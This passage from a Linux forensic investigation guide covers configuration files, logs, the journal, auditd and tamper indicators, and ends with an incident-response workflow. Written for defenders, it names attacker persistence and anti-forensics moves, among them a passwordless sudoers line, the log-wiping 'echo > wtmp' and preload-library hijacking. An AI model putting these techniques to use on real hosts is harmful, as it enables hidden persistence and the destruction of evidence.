yara -r rules/linux_malware.yar /mnt/evidence 2>/dev/null
```

Because a clean image of the same distro version has nearly identical system files, diffing the two directory trees (file lists, hashes, permissions) is one of the fastest ways to find additions.

### Extended attributes, ACLs, and file flags

Use `getfattr -d -m - file` to show extended attributes, including SELinux labels (`security.selinux`) and capabilities (`security.capability`). Use `getfacl` for ACLs and `lsattr` for flags such as immutable (`i`) and append-only (`a`). A mislabelled SELinux context on a binary, or an immutable flag on an attacker's cron file, are both meaningful.

---

## 6. Linux Configuration Files

System configuration lives mostly in `/etc`. Because it is plain text, you can read it directly, but always check file timestamps (and crtime) alongside the content.

### Accounts and authentication

**`/etc/passwd`** has one line per account in the form `name:password:UID:GID:GECOS:home:shell`. The password field is almost always `x`, meaning "see `/etc/shadow`." A hash *in* `/etc/passwd` is a backdoor technique, since world-readable passwd was the pre-shadow scheme and is still honoured. UID 0 means root privileges regardless of name. UIDs below 1000 (below 500 on older RHEL) are system accounts. A system account with `/bin/bash` instead of `/usr/sbin/nologin` is suspicious.

**`/etc/shadow`** is readable only by root. Its fields are `name:hash:lastchg:min:max:warn:inactive:expire:reserved`. `lastchg` is the number of days since 1 January 1970 when the password was last changed, which is useful for dating account creation or password resets. The hash prefix identifies the algorithm:

| Prefix | Algorithm |
|---|---|
| `$1$` | MD5 (legacy, weak) |
| `$5$` | SHA-256 |
| `$6$` | SHA-512 (long-standing default) |
| `$y$` | yescrypt (Debian 11+, Ubuntu 22.04+, Fedora 35+) |
| `$2b$` | bcrypt |

A field starting with `!` or `*` means a locked account or no password. An old-format hash on a single account on a system that otherwise uses yescrypt suggests the attacker generated it with a different tool, for example `openssl passwd -1`.

**`/etc/group` and `/etc/gshadow`** record group membership. Additions to `sudo`, `wheel`, `adm`, `docker` (Docker access is effectively root), `lxd`, or `disk` are privilege escalation paths.

**`/etc/sudoers` and `/etc/sudoers.d/`** define who can run what as root. Watch for lines like `user ALL=(ALL) NOPASSWD: ALL` added by an attacker, or entries granting sudo on binaries that allow shell escape (`vim`, `find`, `less`, `python`; see GTFOBins).

**`/etc/pam.d/`** holds PAM configuration for each service (`sshd`, `sudo`, `login`, `common-auth`, `system-auth`). Look for unknown modules, `pam_exec.so` calling scripts (which can harvest passwords), or `pam_permit.so` in `auth` stacks where it shouldn't be.

**`/etc/security/`** contains `access.conf`, `limits.conf`, and related files.

### SSH

**`/etc/ssh/sshd_config`** and **`/etc/ssh/sshd_config.d/`** configure the server. Check `PermitRootLogin`, `PasswordAuthentication`, `AuthorizedKeysFile`, `AuthorizedKeysCommand` (which can run a command to fetch keys, a stealthy backdoor), `Port`, `ListenAddress`, `Match` blocks, `ForceCommand`, and `LogLevel`.

The host keys in `/etc/ssh/ssh_host_*_key` identify the server. If they have been exfiltrated, the attacker can impersonate it, so they should be rotated.

### Network configuration

Which files matter depends on the distribution and network stack:

- **`/etc/hostname`** and **`/etc/hosts`**: identity and static name resolution. Hosts-file hijacking is used for redirection or to block security updates.
- **`/etc/resolv.conf`**: DNS servers. Often generated by systemd-resolved (`/run/systemd/resolve/`).
- **Debian/Ubuntu**: `/etc/network/interfaces`, and on newer Ubuntu `/etc/netplan/*.yaml`.
- **RHEL**: `/etc/sysconfig/network-scripts/ifcfg-*`, and on RHEL 9 NetworkManager keyfiles.
- **NetworkManager**: `/etc/NetworkManager/system-connections/` stores Wi-Fi SSIDs and pre-shared keys in plain text (root-readable). On laptops this reveals networks the device has joined.
- **Firewall rules**: `/etc/iptables/rules.v4`, `/etc/sysconfig/iptables`, `/etc/nftables.conf`, `/etc/firewalld/`, `/etc/ufw/`.

### System identity, time, and storage

`/etc/os-release` (and `/etc/lsb-release`, `/etc/redhat-release`, `/etc/debian_version`) identify the distro and version. **`/etc/timezone`** and the **`/etc/localtime`** symlink give the time zone. This is essential, because text logs from rsyslog traditionally record local time *without* a zone marker, while journald stores UTC.

`/etc/fstab` lists filesystems mounted at boot, including network shares and swap. `/etc/crypttab` lists encrypted volumes and may reference key files. `/etc/machine-id` uniquely identifies the installation and names the journald directory.

### Scheduled tasks and startup

`/etc/crontab`, `/etc/cron.d/`, `/etc/cron.{hourly,daily,weekly,monthly}/`, `/etc/anacrontab`, `/etc/cron.allow`, and `/etc/cron.deny` cover cron.

For services, check `/etc/systemd/system/` (local and admin units, which override `/lib/systemd/system/` package units) and its `*.wants/` directories, which show what is enabled. Legacy SysV init uses `/etc/init.d/` and `/etc/rc*.d/`, and `/etc/rc.local` may still run on boot where `rc-local.service` exists.

### Shell environment and libraries

`/etc/profile`, `/etc/profile.d/*.sh`, `/etc/bash.bashrc` (Debian) or `/etc/bashrc` (RHEL), and `/etc/environment` run or apply for every login shell. They are ideal for persistence or for injecting `LD_PRELOAD`. `/etc/ld.so.preload`, `/etc/ld.so.conf`, and `/etc/ld.so.conf.d/` control the dynamic linker. Adding a malicious library path, or dropping a malicious library earlier in the search order, is a hijacking technique.

`/etc/skel/` holds the template files copied into new home directories. An attacker who modifies it compromises every *future* user.

### Kernel modules and logging configuration

`/etc/modules`, `/etc/modules-load.d/`, and `/etc/modprobe.d/` control module loading. An `install` directive in `modprobe.d` can run an arbitrary command whenever a module loads.

For logging, check `/etc/rsyslog.conf` and `/etc/rsyslog.d/`, `/etc/systemd/journald.conf` (`Storage=`, `SystemMaxUse=`, `ForwardToSyslog=`), `/etc/logrotate.conf` and `/etc/logrotate.d/` (which determine how far back your logs reach), and `/etc/audit/auditd.conf` with `/etc/audit/rules.d/`. An attacker who edits logging configuration to stop forwarding or to discard auth messages leaves the edit itself behind as evidence.

### Package sources

`/etc/apt/sources.list` and `/etc/apt/sources.list.d/`, `/etc/yum.repos.d/`, and trusted keyrings. A rogue repository combined with a trusted signing key gives an attacker persistent code execution via updates.

### Application configuration

Web servers (`/etc/apache2/`, `/etc/httpd/`, `/etc/nginx/`) reveal document roots, which is where you hunt for webshells, as well as log locations, virtual hosts, and loaded modules. A malicious Apache or Nginx module is a known persistence technique. Database configs (`/etc/mysql/`, `/etc/postgresql/`) and application `.env` files often contain credentials the attacker may have harvested, which shapes the scope of credential rotation.

### User-level configuration and activity artifacts

Each home directory holds per-user configuration and a surprisingly rich record of activity:

- **Shell**: `~/.bashrc`, `~/.bash_profile`, `~/.profile`, `~/.bash_logout`, `~/.zshrc`, and the history files.
- **SSH**: `~/.ssh/authorized_keys` (who can log in *as* this user); `~/.ssh/known_hosts` (hosts this user connected *to*, which is great for lateral movement analysis; it may be hashed if `HashKnownHosts yes`, but you can test candidate hostnames with `ssh-keygen -F`); `~/.ssh/config`; and private keys `id_*`, which may have been stolen or used for pivoting.
- **Editors and tools**: `~/.viminfo` (files edited, search and command history), `~/.lesshst`, `~/.wget-hsts` (HTTPS hosts wget contacted), `~/.python_history`, `~/.mysql_history`, and `~/.gitconfig`.
- **Desktop systems**: `~/.local/share/recently-used.xbel` (recently opened files, with timestamps), `~/.local/share/Trash/` (deleted files with `.trashinfo` records giving original path and deletion date), `~/.cache/thumbnails/`, `~/.config/autostart/`, browser profiles (`~/.mozilla/firefox/`, `~/.config/google-chrome/`), and GNOME's tracker databases.
- **Cloud credentials**: `~/.aws/credentials`, `~/.kube/config`, `~/.docker/config.json`, and `~/.config/gcloud/`. These are prime theft targets and drive your cloud-side investigation.

---

## 7. Linux System Files

"System files" here means the logs, databases, and runtime data the OS maintains about its own activity. These are your richest evidence sources after memory.

### Text logs in /var/log (rsyslog/syslog-ng)

**Authentication**: `/var/log/auth.log` (Debian/Ubuntu) or `/var/log/secure` (RHEL). This is the most important log in most intrusions. Useful patterns:

```bash
grep -E 'Accepted (password|publickey)' auth.log        # successful SSH logins, user and source IP
grep -E 'Failed password|Invalid user' auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn   # brute force sources
grep 'sudo:' auth.log | grep COMMAND                   # every sudo command with user and cwd
grep -E 'useradd|usermod|groupadd|passwd\[' auth.log   # account manipulation
grep 'session opened for user root' auth.log
```

A burst of failures from one IP followed by `Accepted password` from the same IP is the textbook brute-force success. `Accepted publickey` also logs the key's fingerprint, which you can match against keys found in `authorized_keys`.

**General system log**: `/var/log/syslog` (Debian) or `/var/log/messages` (RHEL) holds service starts and stops, cron executions (Debian logs `CRON[pid]: (user) CMD (...)`), network events, and application messages. `/var/log/cron` is the separate cron log on RHEL. `/var/log/kern.log` and `dmesg` show kernel messages: module loads, USB insertions, segfaults (exploit attempts often cause them), and OOM kills (cryptominers often trigger them).

**Package management**: `/var/log/dpkg.log`, `/var/log/apt/history.log` (which records the full command line and the user who ran it), `/var/log/apt/term.log`, `/var/log/yum.log`, and `/var/log/dnf.log` / `dnf.rpm.log`. Attackers install tools such as `nmap`, `masscan`, `gcc` (to compile exploits), and `socat`, and those installations show up here.

**Application logs**: Apache and Nginx access and error logs (`/var/log/apache2/`, `/var/log/httpd/`, `/var/log/nginx/`) are central for web intrusions. Look for requests to unusual `.php`/`.jsp` files, POSTs to upload endpoints, parameters containing shell commands, and scanner user agents. Error logs often capture output from failed exploitation attempts. Others include `/var/log/mysql/`, `/var/log/cloud-init.log` and `cloud-init-output.log` (instance provisioning on cloud VMs, including user-data scripts), and `/var/log/audit/audit.log`.

**Rotation**: logs rotate to `.1`, `.2.gz`, and so on. Always collect them all and use `zgrep`/`zcat`. Retention is set in logrotate configuration and is commonly only four weeks.

### Binary login records

These files use the binary `utmp` struct and need special tools:

- **`/var/run/utmp`** (or `/run/utmp`) records who is logged in *now*.
- **`/var/log/wtmp`** is the historical record of logins, logouts, reboots, and shutdowns.
- **`/var/log/btmp`** records failed login attempts.

```bash
last -Fiw -f /mnt/evidence/var/log/wtmp
lastb -Fiw -f /mnt/evidence/var/log/btmp
utmpdump /mnt/evidence/var/log/wtmp > wtmp.txt    # human-readable; reveals edited/zeroed records
```

Tampering tools such as the old `wtmpclean` family, or crude attempts with `echo > wtmp`, leave zeroed records, time gaps, or a file size that doesn't fit the reboot history. Each utmp record is a fixed size (384 bytes on x86_64 glibc), so a file whose size isn't a multiple of that has been corrupted or tampered with.

**`/var/log/lastlog`** is a sparse file indexed by UID holding each user's last login time. It appears huge but uses little disk space; view it with `lastlog`. Newer util-linux (2.40 and later) introduces `lastlog2`, backed by SQLite at `/var/lib/lastlog/lastlog2.db`, and some distributions are moving to it. Relatedly, `faillog` and `/var/log/tallylog` (or `faillock` under `/var/run/faillock/`) track authentication failures.

### systemd journal

The journal is increasingly the *only* log on modern systems. Journal files are binary, indexed, and include rich metadata: UID, PID, executable path, command line, systemd unit, and boot ID. Timestamps are stored in UTC with microsecond precision.

Journal files live in `/var/log/journal/<machine-id>/` when persistent (Storage=persistent, or Storage=auto with that directory present), or in `/run/log/journal/` when volatile, in which case they are lost at reboot. Many systems only keep volatile logs, so check early.

```bash
journalctl -D /mnt/evidence/var/log/journal --utc --list-boots        # boot history
journalctl -D /mnt/evidence/var/log/journal --utc -u ssh.service      # (sshd.service on RHEL)
journalctl -D ... --since "2024-03-10 00:00" --until "2024-03-11 00:00"
journalctl -D ... _COMM=sudo
journalctl -D ... _EXE=/tmp/.x/miner
journalctl -D ... -o json > journal.json        # full metadata for parsing
journalctl -D ... --verify                      # checks internal consistency (tampering or corruption)
```

Journal files are append-structured, so even after `journalctl --vacuum-*` or deletion, fragments may be recoverable by carving unallocated space for the journal magic header `LPKSHHRH`.

### Linux Audit (auditd)

When configured, auditd provides the closest thing Linux has to Windows Sysmon plus Security event logs: syscall-level recording of process executions (`execve`), file accesses to watched paths, privilege changes, and logins. Its log is `/var/log/audit/audit.log`.

```bash
ausearch -if audit.log -i -m EXECVE --start 03/10/2024 00:00:00
ausearch -if audit.log -i -k <rule_key>          # events matching a rule key, e.g. from Florian Roth's or Neo23x0 ruleset
aureport -if audit.log --login --failed -i
aureport -if audit.log -x --summary              # executables summary
```

An important field is `auid`, the *audit* or login UID. It survives `sudo` and `su`, so you can tie a root action back to the original human login. The `ses` field gives the session number.

### /var/lib: state databases

`/var/lib/dpkg/status` and `/var/lib/dpkg/info/*.md5sums` (Debian), and the RPM database under `/var/lib/rpm/` (SQLite in newer releases), let you verify file integrity offline against the image. Check `/var/lib/dpkg/info/*.list` files to find which package owns a file. Files in system directories that no package owns are suspicious.

`/var/lib/docker/` holds containers, images, volumes, and overlay2 layers. Container logs are in `/var/lib/docker/containers/<id>/<id>-json.log`. `/var/lib/systemd/timers/` holds timer stamp files showing last trigger times. `/var/lib/systemd/coredump/` may hold crash dumps of processes, including exploited ones.

### Spools, caches, and crash data

`/var/spool/cron/` holds user crontabs; `/var/spool/mail/` or `/var/mail/` holds local mail, and cron emails its job output here, which can reveal what a malicious cron job printed. `/var/spool/at/` holds at jobs. `/var/cache/apt/archives/` may contain `.deb` packages the attacker installed. `/var/crash/` (Ubuntu apport) holds crash reports with memory and command lines.

### Temporary and world-writable locations

`/tmp`, `/var/tmp`, and `/dev/shm` should be checked for ELF binaries, scripts, hidden directories, and archives. `/tmp` is often tmpfs and gone after reboot, but `/var/tmp` persists and is often overlooked. Also check `/run/user/<uid>/` and file sockets in unusual places.

### Boot and kernel files

`/boot/` contains `vmlinuz-*` (kernel), `initrd.img-*` or `initramfs-*` (which can be modified for early persistence), `System.map-*` and `config-*` (needed for building Volatility symbols), and `/boot/grub/grub.cfg` or `/boot/grub2/grub.cfg` with `/etc/default/grub` (watch for kernel parameters that disable security, such as `selinux=0`, `apparmor=0`, or odd `init=` values). Check `/lib/modules/<version>/` for `.ko` files not owned by a package, especially under `extra/`, `updates/`, or `misc/`.

### Home directories of service accounts

Don't forget the home directories of `www-data` (`/var/www`), `postgres` (`/var/lib/postgresql`), `mysql`, `nobody`, and similar service accounts. When a web app is exploited, the attacker acts as that user, and their history files, SSH keys, and dropped tools land in that account's home.

### Log integrity and anti-forensics indicators

Signs that logs have been tampered with include:

- **Time gaps** during a period of normal activity. In a busy `auth.log`, a silent hour is itself evidence.
- **Log files that are zero-length** while rotated copies are not, or a log whose first entry is far more recent than the rotation schedule would explain.
- **A missing or abruptly ending `.bash_history`**.
- **`journalctl --verify` failures**.
- **Discrepancies** between journald and rsyslog copies of the same events, or between local logs and those forwarded to a SIEM. The remote copy is your ground truth, which is why off-host logging is the single best preparation step.
- **Modified logging configuration**, or `rsyslog` or `auditd` stopped (its stop event may appear in the journal or in the SIEM).

---

## Putting It All Together: A Typical Investigation Flow

A realistic Linux case usually proceeds like this:

1. **Isolate** the host at the network layer.
2. **Capture memory** with AVML or LiME.
3. **Run a triage collector** such as UAC, which gathers live state, persistence, logs, and configuration.
4. **Image the disk**, or snapshot the cloud volume.
5. **In the lab**, build a super-timeline with Plaso and anchor it on a known-bad event: an alert, a malicious IP, or a suspicious file.
6. **Pivot outward.** Look at what happened just before (the initial access: web logs, `auth.log`) and just after (persistence changes in `/etc`, new files in `/tmp`, cron and systemd modifications, sudo usage).
7. **Use memory analysis** to confirm running implants and recover command history the disk no longer holds.
8. **Verify binary integrity** against package databases and a clean reference.
9. **Scope** by searching other hosts for the same indicators (hashes, IPs, SSH key fingerprints, file paths) with Velociraptor or osquery.
10. **Document** everything with hashes, timestamps, and chain of custody.
